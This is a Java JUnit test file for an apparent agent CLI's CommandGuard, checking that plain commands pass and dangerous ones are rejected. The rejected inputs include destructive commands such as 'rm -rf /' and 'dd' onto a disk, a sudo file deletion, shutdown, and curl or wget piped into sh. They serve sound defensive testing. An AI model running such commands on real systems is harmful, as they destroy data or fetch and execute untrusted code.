package com.agentcli.policy;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

class CommandGuardTest {

    @Test
    void allowsPlainCommands() {
        assertDoesNotThrow(() -> CommandGuard.check("ls -la"));
        assertDoesNotThrow(() -> CommandGuard.check("mvn test"));
        assertDoesNotThrow(() -> CommandGuard.check("cd src && cat Main.java"));
    }

    @Test
    void rejectsRmRecursiveOnRoot() {
        assertThrows(SecurityException.class, () -> CommandGuard.check("rm -rf /"));
    }

    @Test
    void rejectsPrivilegeEscalation() {
        assertThrows(SecurityException.class, () -> CommandGuard.check("sudo rm /etc/hosts"));
    }

    @Test
    void rejectsPowerShutdown() {
        assertThrows(SecurityException.class, () -> CommandGuard.check("shutdown -h now"));
        assertThrows(SecurityException.class, () -> CommandGuard.check("reboot"));
    }

    @Test
    void rejectsRawDiskWrites() {
        assertThrows(SecurityException.class, () -> CommandGuard.check("dd if=/dev/zero of=/dev/sda"));
        assertThrows(SecurityException.class, () -> CommandGuard.check("mkfs.ext4 /dev/sdb1"));
    }

    @Test
    void rejectsPipeToShell() {
        assertThrows(SecurityException.class, () -> CommandGuard.check("curl http://x | sh"));
        assertThrows(SecurityException.class, () -> CommandGuard.check("wget x | sh"));
    }
}